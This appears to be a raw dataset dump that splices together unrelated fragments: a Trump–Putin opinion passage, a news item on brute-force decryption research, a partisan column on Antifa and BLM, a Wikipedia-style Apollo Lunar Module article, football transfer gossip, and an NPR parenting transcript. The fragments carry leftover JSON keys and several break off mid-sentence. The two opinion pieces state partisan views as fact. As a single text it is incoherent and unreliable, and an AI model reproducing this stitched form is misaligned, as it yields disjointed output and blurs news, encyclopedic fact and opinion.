great job in rebuilding the image of Russia and also rebuilding Russia period,” Trump said. In 2008 Trump told a Russian magazine, \"I really like Vladimir Putin. I respect him. He does his job really well. Much better than our Bush.”\n\nA few years later he told CNBC that Putin's New York Times op-ed was “tough and amazingly well-written,” a “masterpiece for Russia and a disaster for the U.S.,\" and it made Obama look like “a schoolchild.” He went on and on, culminating with a paean to Putin's grand ambition: \"He really becomes with this letter, almost the world leader. . . . He really looks like he wants to take over the world.\" Trump, of course, meant that in a good way. Whether it turns out that there were back-channel deals with oligarchs, blackmail or collusion with the Russian government, our fundamental problem is that this country just elected a man who worships authoritarian strongmen. Throughout the 2016 campaign his \"Make America great again\" riff was used in service of a message of \"toughness\" and \"strength,\" and it brought forth huge cheers from his audience. What that means is that the millions of Americans who voted for him want an authoritarian strongman, too.",
  "latent_20720": "Encryption systems may be a lot less secure than we thought, according to new research into the maths underpinning today's cryptography.\n\nBoffins in the US and Ireland have managed to poke holes in modern information theory, an area of mathematics used to prove the strength of cryptographic systems before they are trusted and widely deployed.\n\nAs a result, the scientists claim it's easier to take encrypted files and deduce their original unencrypted contents than one would expect.\n\nIn other words, computers can find correlations between encrypted data and its unencrypted form far faster than previously thought, and eventually crack the lot. Code-breaking software needs to find just one reliable correlation before it can hit the jackpot.\n\nCracking an encrypted file will still be a hard slog, we're reassured, but just not quite as tough: an attacker could unlock a file far sooner than the many months or years of processing time previously estimated.\n\nThat's because information theory, built on work by Claude Shannon in 1948, assumes certain things about the entropy of digital information - simply put, how disordered the data is in a message. Analyses of modern cryptographic algorithms assume perfectly uniform sources of information, in which the mix of binary 1s and 0s is perfectly random and hopelessly unpredictable.\n\nIn reality, data is never that perfect: parts of files can be guessed and those bytes used as a foothold in cracking open the data by brute force.\n\n“It’s still exponentially hard, but it’s exponentially easier than we thought,” said Ken Duffy, of the National University of Ireland (NUI), who co-wrote this latest research.\n\n\"Attackers often use graphics processors to distribute the problem. You’d be surprised at how quickly you can guess stuff.”\n\nDuffy and three other scientists from the Massachusetts Institute of Technology (MIT) and the NUI presented their work, Brute force searching, the typical set and guesswork, at the International Symposium on Information Theory [PDF]. A follow-up paper, due to be unveiled this autumn at the Asilomar Conference on Signals and Systems, will take the research one step further: it will demonstrate that keyless door locks that work with wireless keycards may not be as secure as previously thought.\n\nMatthieu Bloch, an assistant professor of electrical and computer engineering at the Georgia Institute of Technology, said the above research does not mean cryptographic systems in wide use today are fundamentally insecure, rather that they are less secure than we've all been led to believe.\n\n\"My guess is that it will show that some of them are slightly less secure than we had hoped, but usually in the process, we’ll also figure out a way of patching them,\" he said. \"It’s essentially saying, ‘Hey, we have to be careful.’ But it also provides a methodology to go back and reanalyse all these things.\" ®",

  "latent_21252": "Netanyahu’s son is exactly right about the rise of Antifa and BLM\n\nIsraeli Prime Minister Bibi Netanyahu’s son, Yair Netanyahu, is facing backlash from the Left after criticizing both “neo-Nazi scum” and “the thugs of Antifa and BLM” in a Facebook post commenting on the violence in Charlottesville, Va.\n\nEarly Wednesday, Yair said that the growing presence of hard-left radicals on American university campuses posed a more long-term danger than the resurgence of neo-Nazi, Alt-“Right” racists.\n\n“To put things in perspective. I’m a Jew, I’m an Israeli, the neo nazi scums in Virginia hate me and my country. But they belong to the past. Their breed is dying out,” he wrote.\n\n“However the thugs of Antifa and BLM who hate my country (and America too in my view) just as much are getting stronger and stronger and becoming super dominant in American universities and public life.”\n\nYair Netanyahu is exactly right about the growing presence of the hard Left on college campuses. American University professors are proposing to create a “Campus Antifascist Network,” or CAN, to counter what the Left believes is a marked increase in fascist activity since the election of President Donald Trump.\n\n“The election of Donald Trump has emboldened fascist and white nationalist groups nationwide, on campus and off, and their recent upsurge requires antifascists to take up the call to action once again,” says the Louise Hewlett Nixon Professor and professor of comparative literature at Stanford University, David Palumbo-Liu, in an invitation to join the group.\n\n“As we wrote this letter,” it says, “hundreds of torch-bearing white supremacists were marching on the campus of University of Virginia chanting ‘Jews will not replace us’ and other vile slurs. An antifascist activist was murdered by these same forces in Charlottesville, raising the stakes of resistance to new heights.”\n\nCAN co-organizer Bill Mullen, a professor of American studies at Purdue University, told Inside Higher Ed that the organization will be a “big tent” that “welcomes anyone committed to fighting fascism.”\n\nWhile Professor Palumbo-Liu explicitly said that CAN would reject the Antifa activists’ propensity for violence, the Left’s anti-fascist “big tent” has already brought together multiple leftist organizations in solidarity with the most extreme and violent Antifa radicals.\n\nThe danger, of course, is who are the gatekeepers? Who decides which speakers on college campuses are “white nationalists” and which ones aren’t? Antifa has previously responded violently to speeches by Ann Coulter. Ben Shapiro has been called a member of the “Alt-Right.” Charles Murray was met with violence at Middlebury College. These are conservatives, not neo-Nazis, and yet the Left is slandering many conservatives as “Nazis” in an attempt to paint the conservative movement as extremist, white supremacist, and violent.\n\nSo Yair Netanyahu makes a fair point. The growing presence of “anti-fascist” leftists on college campuses is becoming more dominant. They are continuing an assault on free speech in the name of opposing Nazis. And the mainstream media, meanwhile, is covering up the violence by Antifa groups.\n\nThis can’t end well.",

The lander spacecraft were built for the US Apollo program by Grumman Aircraft. The lunar module, consisting of a descent stage and an ascent stage, was ferried from the Earth to the Moon attached to the Apollo spacecraft command and service module (CSM), approximately twice its mass. The ascent stage carried a crew of two who flew the spacecraft from lunar orbit to the surface and later back to the command module. Designed for lunar orbit rendezvous, the Apollo Lunar Module was discarded after completing its mission. It was capable of operation only in outer space; structurally and aerodynamically it was incapable of flight through the Earth's atmosphere. The lunar module was the first manned spacecraft to operate exclusively in the airless vacuum of space. It was the first, and to date only, crewed vehicle to land anywhere beyond Earth.\n\nThe LM's development was plagued with problems which delayed its first unmanned flight by about ten months, and its first manned flight by about three months. Despite this, the LM eventually became the most reliable component of the Apollo/Saturn space vehicle, the only component never to suffer a failure that could not be corrected in time to prevent abort of a landing mission.[1]\n\nTen lunar modules were launched into space. Of these, six successfully landed humans on the Moon between 1969 and 1972. The first two launched were test flights in low Earth orbit—the first without a crew, the second with one. Another was used by Apollo 10 for a \"dress rehearsal\" flight in low lunar orbit, without landing. One lunar module functioned as a \"lifeboat\" for the crew of Apollo 13, providing life support and propulsion when their CSM was disabled by an oxygen tank explosion en route to the Moon, forcing the crew to abandon their landing.\n\nThe total cost of the LM for development and the units produced was $21.3B in 2016 dollars, adjusting from a nominal total of $2.2B[2] using the NASA New Start Inflation Indices.[3] The six landed descent stages remain intact where they landed and one ascent stage (Apollo 10's) is in heliocentric orbit. All the other LMs that flew either crashed into the Moon or burned up in the Earth's atmosphere.\n\nOperational profile [ edit ]\n\nAt launch, the lunar module sat directly beneath the command and service module (CSM) with legs folded, inside the Spacecraft-to-LM adapter (SLA) attached to the S-IVB third stage of the Saturn V rocket. There it remained through Earth parking orbit and the Trans Lunar Injection (TLI) rocket burn to send the craft toward the Moon.\n\nSoon after TLI, the SLA opened and the CSM separated, turned around, came back to dock with the lunar module, and extracted it from the S-IVB. During the flight to the Moon, the docking hatches were opened and the lunar module pilot entered the LM to temporarily power up and test its systems (except for propulsion). Throughout the flight, he performed the role of an engineering officer, responsible for monitoring the systems of both spacecraft.\n\nAfter achieving a lunar parking orbit, the Commander and LM Pilot entered and powered up the LM, replaced the hatches and docking equipment, unfolded and locked its landing legs, and separated from the CSM, flying independently. The Commander operated the flight controls and engine throttle, while the lunar module pilot operated other spacecraft systems and kept the Commander informed on systems status and navigational information. After visual inspection of the landing gear by the Command Module Pilot, the LM was withdrawn to a safe distance, then the descent engine was pointed forward into the direction of travel to perform the 30 second descent orbit insertion burn to reduce speed and drop the LM's perilune to within approximately 50,000 feet (15 km) of the surface,[4] about 260 nautical miles (480 km) uprange of the landing site.\n\nEagle, the lunar module ascent stage of , the lunar module ascent stage of Apollo 11 , in orbit above the Moon. Earth is visible in the distance.\n\nAt this point, the engine was started again for powered descent initiation. During this time the crew flew on their backs, depending on the computer to slow the craft's forward and vertical velocity to near zero. Control was exercised with a combination of engine throttling and attitude thrusters, guided by the computer with the aid of landing radar. During the braking phase altitude decreased to approximately 10,000 feet (3.0 km), then the final approach phase went to approximately 700 feet (210 m). During final approach, the vehicle pitched over to a near-vertical position, allowing the crew to look forward and down to see the lunar surface for the first time.[5]\n\nAstronauts only flew Apollo spacecraft manually during the lunar approach.[6] The final landing phase began approximately 2,000 feet (0.61 km) uprange of the targeted landing site. At this point manual control was enabled for the Commander, and enough propellant reserve was allocated to allow approximately two minutes of hover time to survey where the computer was taking the craft and make any necessary corrections. If necessary, landing could have been aborted at almost any time by jettisoning the descent stage and firing the ascent engine to climb back into orbit for an emergency return to the CSM. Finally, one or more of three 67.2-inch (1.71 m) long probes extending from footpads on the legs of the lander touched the surface, activating the contact indicator light which signaled the commander to manually shut off the descent engine, allowing the LM to settle onto the surface. On touchdown, the probes would be bent as much as 180 degrees, or even break off. The original design used the probes on all four legs, but starting with the first landing (LM-5 on Apollo 11), the one at the ladder was removed out of concern that the bent probe after landing could possibly puncture an astronaut's suit while he descended or stepped off the ladder.\n\nThe original Extra-Vehicular Activity (EVA) plan, up through at least 1966, was for only one astronaut to leave the LM while the other remained inside in order \"to maintain communications\".[7] Communications were eventually deemed to be reasonably reliable so that both crew members could walk on the surface, leaving the spacecraft to be only remotely attended by Mission Control.\n\nBeginning with Apollo 14, increased LM propellant reserve was made available for the powered descent and landing, by using the CSM engine to achieve the 50,000-foot (15 km) perilune. After the spacecraft undocked, the CSM raised and circularized its orbit for the remainder of the mission.\n\nWhen ready to leave the Moon, the LM would separate the descent stage and fire the ascent engine to climb back into orbit, using the descent stage as a launch platform. After a few course correction burns, the LM would rendezvous with the CSM and dock for transfer of the crew and rock samples. Having completed its job, the ascent stage was separated. The Apollo 10 ascent stage engine was fired to fuel depletion, sending it on a trajectory past the Moon into a heliocentric orbit.[8][9] The Apollo 11 ascent stage was left in lunar orbit to eventually crash; all subsequent ascent stages (except for Apollo 13) were intentionally steered into the Moon to obtain readings from seismometers placed on the surface.\n\nHistory [ edit ]\n\nA 1962 model of the first LEM design, docked to the command and service module, is held by Dr. Joseph F. Shea\n\nThe lunar module (originally designated the lunar excursion module, known by the acronym LEM) was designed after NASA chose to reach the Moon via Lunar Orbit Rendezvous (LOR) instead of the direct ascent or Earth Orbit Rendezvous (EOR) methods. Both direct ascent and EOR would have involved landing a much heavier, complete Apollo spacecraft on the Moon. Once the decision had been made to proceed using LOR, it became necessary to produce a separate craft capable of reaching the lunar surface and ascending back to lunar orbit.\n\nContract letting [ edit ]\n\nIn July 1962, eleven firms were invited to submit proposals for the LEM. Nine companies responded in September, answering 20 specific questions posed by the NASA RFP in a 60-page limited technical proposal. Grumman Aircraft was awarded the contract two months later. Grumman had begun lunar orbit rendezvous studies in the late 1950s and again in 1961. The contract cost was expected to be around $350 million. There were initially four major subcontractors—Bell Aerosystems (ascent engine), Hamilton Standard (environmental control systems), Marquardt (reaction control system) and TRW's Space Technology Laboratories (descent engine).[10]\n\nThe Primary Guidance, Navigation and Control System (PGNCS) was developed by the MIT Instrumentation Laboratory; the Apollo Guidance Computer was manufactured by Raytheon (a similar guidance system was used in the command module). A backup navigation tool, the Abort Guidance System (AGS), was developed by TRW.\n\nDesign phase [ edit ]\n\nThis 1963 model depicts the second LEM design, which gave rise to informal references as \"the bug\".\n\nThe Apollo Lunar Module was chiefly designed by Grumman aerospace engineer Thomas J. Kelly.[11] The first LEM design looked like a smaller version of the Apollo command and service module (a cone-shaped cabin atop a cylindrical propulsion section) with folding legs. The second design invoked the idea of a helicopter cockpit with large curved windows and seats, to improve the astronauts' visibility for hover and landing. This also included a second, forward docking port, allowing the LEM crew to take an active role in docking with the CSM.\n\nAs the program continued, there were numerous redesigns to save weight, improve safety, and fix problems. First to go were the heavy cockpit windows and the seats; the astronauts would stand while flying the LEM, supported by a cable and pulley system, with smaller triangular windows giving them sufficient visibility of the landing site. Later, the redundant forward docking port was removed, which meant the Command Pilot gave up active control of the docking to the Command Module Pilot; he could still see the approaching CSM through a small overhead window. These changes resulted in significant weight savings. Egress while wearing bulky Extra-Vehicular Activity (EVA) spacesuits was also facilitated by a simpler-opening forward hatch (32 x 32 inches).\n\nA configuration freeze did not start until April 1963, when the ascent and descent engine designs were decided. In addition to Rocketdyne, a parallel program for the descent engine was ordered from Space Technology Laboratories (TRW) in July 1963, and by January 1965 the Rocketdyne contract was canceled.\n\nPower was initially to be produced by fuel cells built by Pratt and Whitney similar to the CSM, but in March 1965 these were discarded in favor of an all-battery design.[12]\n\nThe initial design had three landing legs. As any particular leg would have to carry the weight of the vehicle if it lands at any significant angle, three legs was the lightest configuration. However, it would be the least stable if one of the legs were damaged during landing. The next landing gear design iteration had five legs and was the most stable configuration for landing on an unknown terrain. That configuration, however, was too heavy and the designers compromised on four landing legs.[13]\n\nIn June 1966, the name was changed to lunar module (LM), eliminating the word \"excursion\".[14][15] According to George Low, Manager of the Apollo Spacecraft Program Office, this was because NASA was afraid that the word \"excursion\" might lend a frivolous note to Apollo.[16] After the name change from \"LEM\" to \"LM\", the pronunciation of the abbreviation did not change, as the habit became ingrained among engineers, the astronauts, and the media to universally pronounce \"LM\" as \"lem\" which is easier than saying the letters individually.\n\nAstronaut training [ edit ]\n\nLunar Landing Research Vehicle (LLRV) during a test flight\n\nTo allow astronauts to learn lunar landing techniques, NASA contracted Bell Aerosystems in 1964 to build the Lunar Landing Research Vehicle (LLRV), which used a gimbal-mounted vertical jet engine to counter 5/6 of its weight to simulate the Moon's gravity, in addition to its own hydrogen peroxide thrusters to simulate the LM's descent engine and attitude control. Successful testing of two LLRV prototypes at the Dryden Flight Research Center led in 1966 to three production Lunar Landing Training Vehicles (LLTV) which along with the LLRV's were used to train the astronauts at the Houston Manned Spacecraft Center. This aircraft proved fairly dangerous to fly, as three of the five were destroyed in crashes. It was equipped with a rocket-powered ejection seat, so in each case the pilot survived, including the first man to walk on the Moon, Neil Armstrong.[17]\n\nDevelopment flights [ edit ]\n\nThe Apollo 6 Lunar Module Test Article (LTA-2R) shortly before being mated with the SLA\n\nLM-1 was built to make the first unmanned flight for propulsion systems testing, launched into low Earth orbit atop a Saturn IB. This was originally planned for April 1967, to be followed by the first manned flight later that year. But the LM's development problems had been underestimated, and LM-1's flight was delayed until January 22, 1968, as Apollo 5. At that time, LM-2 was held in reserve in case the LM-1 flight failed, which did not happen.\n\nLM-3 now became the first manned LM, again to be flown in low Earth orbit to test all the systems, and practice the separation, rendezvous, and docking planned for Apollo 8 in December 1968. But again, last-minute problems delayed its flight until Apollo 9 on March 3, 1969. A second, higher Earth orbit manned practice flight had been planned to follow LM-3, but this was canceled to keep the program timeline on track.\n\nApollo 10 launched on May 18, 1969, using LM-4 for a \"dress rehearsal\" for the lunar landing, practicing all phases of the mission except powered descent initiation through takeoff. The LM descended to 47,400 feet (14.4 km) above the lunar surface, then jettisoned the descent stage and used its ascent engine to return to the CSM.[18]\n\nProduction flights [ edit ]\n\nThe first manned lunar landing occurred on July 20, 1969 with the Apollo 11 LM Eagle. Four days later, the Apollo 11 crew in the Command Module Columbia splashed down in the Pacific Ocean, completing President John F. Kennedy's goal \"before this decade is out, of landing a man on the Moon and returning him safely to the Earth.\"\n\nThis was followed by precision landings on Apollo 12 (Intrepid) and Apollo 14 (Antares).\n\nEagle in lunar orbit The Apollo 11 lunar modulein lunar orbit\n\nIn April 1970, the Apollo 13 lunar module Aquarius played an unexpected role in saving the lives of the three astronauts after an oxygen tank in the service module ruptured, disabling the CSM. Aquarius served as a \"lifeboat\" for the astronauts during their return to Earth. Its descent stage engine was used to replace the crippled CSM Service Propulsion System engine, and its batteries supplied power for the trip home and recharged the Command Module's batteries critical for reentry. The astronauts splashed down safely on April 17, 1970. The LM's systems, designed to support two astronauts for 45 hours (including twice depressurization and repressurization causing loss of oxygen supply), actually stretched to support three astronauts for 90 hours (without depressurization and repressurization and loss of oxygen supply).\n\nHover times were maximized on the last four landing missions by using the Service Module engine to perform the initial descent orbit insertion burn 22 hours before the LM separated from the CSM, a practice begun on Apollo 14. This meant that the complete spacecraft, including the CSM, orbited the Moon with a 9.1-nautical-mile (16.9 km) perilune, enabling the LM to begin its powered descent from that altitude with a full load of descent stage propellant, leaving more reserve propellant for the final approach. The CSM would then raise its perilune back to the normal 60 nautical miles (110 km).[19]\n\nExtended J-class missions [ edit ]\n\nDecreased clearance led to buckling of the extended descent engine nozzle on the landing of Apollo 15\n\nThe extended lunar module (ELM) used on the final three \"J-class missions\", Apollo 15, 16 and 17, were significantly upgraded to allow for greater landing payload weights and longer lunar surface stay times. The descent engine power was improved by the addition of a 10-inch (250 mm) extension to the engine bell, and the descent propellant tanks were increased in size. A waste storage tank was added to the descent stage, with plumbing from the ascent stage. These upgrades allowed stay times of up to 75 hours on the Moon.\n\nThe Lunar Roving Vehicle was carried folded up in Quadrant 1 of the descent stage and deployed by the astronauts after landing. This allowed them to explore large areas and return a greater variety of lunar samples.\n\nSpecifications [ edit ]\n\nLunar module diagram\n\nLunar module crew cabin\n\nAstronaut rest (sleeping) accommodation\n\nLunar module cutaway illustration\n\nNote that weights varied from mission to mission; those given here are an average for the non-ELM class vehicles. See the individual mission articles for each LM's weight.\n\nAscent stage [ edit ]\n\nThe Ascent stage contained the crew cabin with instrument panels and flight controls. It contained its own Ascent Propulsion System (APS) engine and two hypergolic propellant tanks for return to lunar orbit and rendezvous with the Apollo command and service module. It also contained a Reaction Control System (RCS) for attitude and translation control, which consisted of sixteen hypergolic thrusters similar to those used on the Service Module, mounted in four quads, with their own propellant supply. A forward EVA hatch provided access to and from the lunar surface, while an overhead hatch and docking port provided access to and from the Command Module.\n\nInternal equipment included an environmental control (life support) system; a VHF communications system with two antennas for communication with the Command Module; a unified S-band system and steerable parabolic dish antenna for communication with Earth; an EVA antenna resembling a miniature parasol which relayed communications from antennas on the astronauts' Portable Life Support Systems through the LM; primary (PGNCS) and backup (AGS) guidance and navigation systems; an Alignment Optical Telescope for visually determining the spacecraft orientation; rendezvous radar with its own steerable dish antenna; and an ice sublimation system for active thermal control. Electrical storage batteries, cooling water, and breathing oxygen were stored in amounts sufficient for a lunar surface stay of 48 hours initially, extended to 75 hours for the later missions.\n\nDuring rest periods while parked on the Moon, the crew would sleep on hammocks slung crosswise in the cabin.\n\nThe return payload included the lunar rock and soil samples collected by the crew (as much as 238 pounds (108 kg) on Apollo 17), plus their exposed photographic film.\n\nCrew: 2\n\nCrew cabin volume: 235 cu ft (6.7 m 3 )\n\n) Habitable volume: 160 cu ft (4.5 m 3 )\n\n) Crew compartment height: 7 ft 8 in (2.34 m)\n\nCrew compartment depth: 3 ft 6 in (1.07 m)\n\nHeight: 9 ft 3.5 in (2.832 m)\n\nWidth: 14 ft 1 in (4.29 m)\n\nDepth: 13 ft 3 in (4.04 m)\n\nMass, dry: 4,740 lb (2,150 kg)\n\nMass, gross: 10,300 lb (4,700 kg)\n\nAtmosphere: 100% oxygen at 4.8 psi (33 kPa)\n\nWater: two 42.5 lb (19.3 kg) storage tanks\n\nCoolant: 25 pounds (11 kg) of ethylene glycol / water solution\n\nThermal Control: one active water-ice sublimator\n\nRCS propellant mass: 633 lb (287 kg)\n\nRCS thrusters: sixteen x 100 lbf (440 N) in four quads\n\nRCS propellants: Aerozine 50 fuel / nitrogen tetroxide (N 2 O 4 ) oxidizer\n\nO ) oxidizer RCS specific impulse: 290 s (2,840 N·s/kg)\n\nAPS propellant mass: 5,187 lb (2,353 kg) stored in two 36-cubic-foot (1.02 m 3 ) propellant tanks\n\n) propellant tanks APS engine: Bell Aerospace LM Ascent Engine (LMAE) & Rocketdyne LMAE Injectors\n\nAPS thrust: 3,500 lbf (16,000 N)\n\nAPS propellants: Aerozine 50 fuel / nitrogen tetroxide oxidizer\n\nAPS pressurant: two 6.4 lb (2.9 kg) helium tanks at 3,000 pounds per square inch (21 MPa)\n\nAPS specific impulse: 311 s (3,050 N·s/kg)\n\nAPS delta-V: 7,280 ft/s (2,220 m/s)\n\nThrust-to-weight ratio at liftoff: 2.124 (in lunar gravity)\n\nBatteries: two 28–32 volt, 296 ampere-hour silver-zinc batteries; 125 lb (57 kg) each\n\nPower: 28 V DC, 115 V 400 Hz AC\n\nDescent stage [ edit ]\n\nScale model of the Apollo Lunar Module at the Euro Space Center in Belgium\n\nThe descent stage's primary job was to support a powered landing and surface extravehicular activity. When the excursion was over, it served as the launch pad for the ascent stage. Octagon-shaped, it was supported by four folding landing gear legs, and contained a throttleable Descent Propulsion System (DPS) engine with four hypergolic propellant tanks. A continuous-wave Doppler radar antenna was mounted by the engine heat shield on the bottom surface, to send altitude and rate of descent data to the guidance system and pilot display during the landing. Almost all external surfaces, except for the top, platform, ladder, descent engine and heat shield, were covered in amber, dark (reddish) amber, black, silver, and yellow aluminized Kapton foil blankets for thermal insulation. The number 1 (front) landing leg had an attached platform (informally known as the \"porch\") in front of the ascent stage's EVA hatch and a ladder, which the astronauts used to ascend and descend between the cabin to the surface. The footpad of each landing gear contained a 67-inch (170 cm)-long surface contact sensor probe, which signaled the commander to switch off the descent engine. (The probe was omitted from the number 1 leg of every landing mission, to avoid a suit-puncture hazard to the astronauts, as the probes tended to break off and protrude upwards from the surface.)\n\nEquipment for the lunar exploration was carried in the Modular Equipment Stowage Assembly (MESA), a drawer mounted on a hinged panel dropping out of the lefthand forward compartment. Besides the astronaut's surface excavation tools and sample collection boxes, the MESA contained a television camera with a tripod; as the commander opened the MESA by pulling on a lanyard while descending the ladder, the camera was automatically activated to send the first pictures of the astronauts on the surface back to Earth. A United States flag for the astronauts to erect on the surface was carried in a container mounted on the ladder of each landing mission.\n\nThe Early Apollo Surface Experiment Package (EASEP) (later the Apollo Lunar Surface Experiment Package (ALSEP)), was carried in the opposite compartment behind the LM. An external compartment on the right front panel carried a deployable S-band antenna which, when opened looked like an inverted umbrella on a tripod. This was not used on the first landing due to time constraints, and the fact that acceptable communications were being received using the LM's S-band antenna, but was used on Apollo 12 and 14. A hand-pulled Modular Equipment Transporter (MET), similar in appearance to a golf cart, was carried on Apollo 13 and 14 to facilitate carrying the tools and samples on extended moonwalks. On the extended missions (Apollo 15 and later), the antenna and TV camera were mounted on the Lunar Roving Vehicle, which was carried folded up and mounted on an external panel. Compartments also contained replacement Portable Life Support System (PLSS) batteries and extra lithium hydroxide canisters on the extended missions.\n\nHeight: 10 ft 7.2 in (3.231 m) (plus 5 ft 7.2 in (1.707 m) landing probes)\n\nWidth/depth, minus landing gear: 13 ft 10 in (4.22 m)\n\nWidth/depth, landing gear extended: 31.0 ft (9.4 m)\n\nMass including propellant: 22,783 lb (10,334 kg)\n\nWater: one 151 kg (333 lb) storage tank\n\nDPS propellant mass: 18,000 lb (8,200 kg) stored in four 67.3-cubic-foot (1.906 m 3 ) propellant tanks\n\n) propellant tanks DPS engine: TRW LM descent engine (LMDE) [20]\n\nDPS thrust: 10,125 lbf (45,040 N), throttleable between 10% and 60% of full thrust\n\nDPS propellants: Aerozine 50 fuel / nitrogen tetroxide oxidizer\n\nDPS pressurant: one 49-pound (22 kg) supercritical helium tank at 1,555 psi (10.72 MPa)\n\nDPS specific impulse: 311 s (3,050 N·s/kg)\n\nDPS delta-V: 8,100 ft/s (2,500 m/s)\n\nBatteries: four (Apollo 9-14) or five (Apollo 15-17) 28–32 V, 415 A·h silver-zinc batteries; 135 lb (61 kg) each\n\nLunar modules produced [ edit ]\n\nWorld map showing locations of Apollo Lunar Modules (along with other hardware).\n\nProposed derivatives [ edit ]\n\nApollo Telescope Mount [ edit ]\n\nOriginal proposed \"wet workshop\" Skylab with the Apollo Telescope Mount\n\nOne proposed Apollo application was an orbital solar telescope constructed from a surplus LM with its descent engine replaced with a telescope controlled from the ascent stage cabin, the landing legs removed and four \"windmill\" solar panels extending from the descent stage quadrants. This would have been launched on an unmanned Saturn 1B, and docked with a manned command and service module, named the Apollo Telescope Mission (ATM).\n\nThis idea was later transferred to the original wet workshop design for the Skylab orbital workshop and renamed the Apollo Telescope Mount to be docked on a side port of the workshop's multiple docking adapter (MDA). When Skylab changed to a \"dry workshop\" design pre-fabricated on the ground and launched on a Saturn V, the telescope was mounted on a hinged arm and controlled from inside the MDA. Only the octagonal shape of the telescope container, solar panels and the Apollo Telescope Mount name were kept, though there was no longer any association with the LM.\n\nLM Truck [ edit ]\n\nThe Apollo LM Truck (also known as Lunar Payload Module) was a stand-alone LM descent stage intended to deliver up to 11,000 pounds (5.0 t) of payload to the Moon for an unmanned landing. This technique was intended to deliver equipment and supplies to a permanent manned lunar base. As originally proposed, it would be launched on a Saturn V with a full Apollo crew to accompany it to lunar orbit and guide it to a landing next to the base; then the base crew would unload the \"truck\" while the orbiting crew returned to Earth.[24] In later AAP plans, the LPM would have been delivered by an unmanned lunar ferry vehicle.\n\nDepiction in film and television [ edit ]\n\nThe Ron Howard film Apollo 13, a dramatization of that mission starring Tom Hanks, Kevin Bacon, and Bill Paxton, was filmed using realistic spacecraft interior reconstructions of the Aquarius and the Command Module Odyssey.\n\nThe development and construction of the lunar module is dramatized in the miniseries From the Earth to the Moon episode entitled \"Spider\". This is in reference to LM-3, used on Apollo 9, which the crew named Spider after its spidery appearance. The unused LM-13 stood in during the teleplay to depict LM-3 and LM-5, Eagle, used by Apollo 11.\n\nMedia [ edit ]\n\nEquipment location plans (1 of 2)\n\nEquipment location plans (2 of 2)\n\nControls plans\n\nLanding Gear plans\n\nApollo 15 landing on the Moon seen from the perspective of the Lunar Module Pilot.

The Reds have been long-time favourites to sign two of Europe’s most gifted young players whose contracts expire next summer.\n\nBoth have turned down a string of proposed transfers this summer to wait for the right Premier League club - until now believed to be Liverpool.\n\nBut while Liverpool have been distracted by the furore surrounding Luis Suarez, Spurs have made their move.\n\nThe White Hart Lane club have already spent £52m on new faces. They want to add Eriksen and Alderweireld before reviewing Gareth Bale’s proposed £85m move to Real Madrid.\n\nMidfielder Eriksen is only 21 but has won 36 Denmark caps. This summer he has rejected offers from Italy, Germany and Russia.\n\nZenit Saint Petersburg, Borussia Dortmund, Bayer Leverkusen, AS Roma and AS Monaco offered either Champions League football or extreme wage packets to the player.\n\nLiverpool boss Brendan Rodgers has been raising funds by selling fringe players so may hope to scupper Spurs’ move.\n\n“I am prepared to wait. I will only go where my heart wants to go,’’ Eriksen said, explaining that he is keen to go to a club with stature and history in the Premier League.\n\n“I am patiently waiting what will happen in the next few weeks. But I have said before I only want to go to a club where I feel I can play at my best and which suits my style.’’\n\n“I am ready for something new, I am ready for bigger options.

The Belgium international centre-back has already rejected a move to Norwich City.\n\nMarc Overmars, Ajax’s technical director, has confirmed that his club have agreed a deal for the defender with Spartak Moscow. Again, Alderweireld is refusing to sign.\n\nSpurs have made their move in the last few days. A delegation of scouts travelled last weekend to Amsterdam to watch the Belgium player in his club’s first league game of the season.

She speaks with a group of parents and experts: author Christina Hoff Sommers, New York University education professor Pedro Noguera, University of Virginia Dean Bob Pianta, and Glenn Ivey, father of five boys.\n\nMICHEL MARTIN, HOST:\n\nI'm Michel Martin and this is TELL ME MORE from NPR News. They say it takes a village to raise a child, but maybe you just need a few moms and dads in your corner every week. We check in with a diverse group of parents for their common sense and savvy advice. Now, we are continuing our conversation about the so-called achievement gap with boys.\n\nWe're asking why is it that boys are falling behind girls on some key measures like grades, participation in advanced classes and graduation rates. Still with us is Christina Hoff Sommers. She's been writing about this for years and she recently wrote the commentary, \"The Boys at the Back,\" for the New York Times. She's author of the book, \"The War Against Boys.\"\n\nAlso joining us now is Pedro Noguera. He is an education professor at New York University and he has written extensively about a number of achievement gaps, and he's also the father of five, including three boys. Glenn Ivey is back with us. He's an attorney in private practice. He's the former State's Attorney for Prince George's County, which is in the Washington, D.C. suburbs.\n\nHe's one of our regular contributors to our parenting roundtable and he is the father of six, including five boys. And Bob Pianta is dean of the Curry School of Education at the University of Virginia. His research focuses on the psychology of teaching and he's also a dad of three, including two boys, and I thank you all so much for joining us and staying with us.\n\nPEDRO NOGUERA: Pleasure.\n\nGLENN IVEY: Hello, Michel.\n\nROBERT PIANTA: Thank you.\n\nMARTIN: And I realize we're just going to scratch the surface, so I apologize for that in advance, but you all have professional experience with this as well as personal experience, so I'm just going to start by asking each of you in turn, and Glenn, I'll start with you. Have you seen this yourself? Do you feel that there's kind of a structured bias in a system that favors girls and it disadvantages boys?\n\nIVEY: Well yeah. I think it pops up in a number of different ways, but certainly schools are the places where we care about it early and a lot of its behavioral driven, you know, sort of being super active and, quote, unquote, \"acting out.\" It frequently gets punished. I mean, we had a case in Northern Virginia, just a couple of weeks ago. I'm in the private practice now, but you know, a kid brought a toy gun to school and not only was he, like, expelled, he was arrested.\n\nThe police came and got him and took him out.\n\nMARTIN: And he was something like 10 years old.\n\nIVEY: He was 10 years old. Ten years old and apparently it looked like a toy gun because it had like an orange tip to it or something like that. And I know we're nervous about everything in the wake of Newtown and Aurora and other places, but that just struck me as an extremely heavy-handed approach. And, you know, when you come down on a kid with the hammer for something like that, you can have a real damaging impact for that kid going forward, so.\n\nMARTIN: I want to talk more about that because something - people are talking a lot these days about what they call the school to prison pipeline and since you've been a prosecutor I want to talk to you a little bit about that, but I want to go to Professor Noguera now. You've done an enormous amount of research into this issue as well and we've talked about this new research in the Journal of Human Resources that describes that behavior plays a bigger role in evaluating grades and setting grades than I think many teachers and educators might have suspected.\n\nCan I just get your reaction to this, particularly as it relates to boys of color?\n\nNOGUERA: Well, I think that Christine Sommers work and the article she wrote is drawing attention to a bias that's there that does have, not just disproportionate impact on boys, but particularly boys of color, black and Latino boys, and something that we should be aware of. At the same time, I want to complicate the issue some and recognize and point out that men still dominate our society.\n\nMen dominate politics, they are the leaders of our corporations and churches for the most part, and so we're still living in a patriarchy. So we have to ask ourselves, what's going on that boys would be at risk? And I would say that while there may be biases in schools, it is also clear that traditional forms of masculinity have outlived their purpose. We have lots of boys who at an early age start to think of education as being not masculine 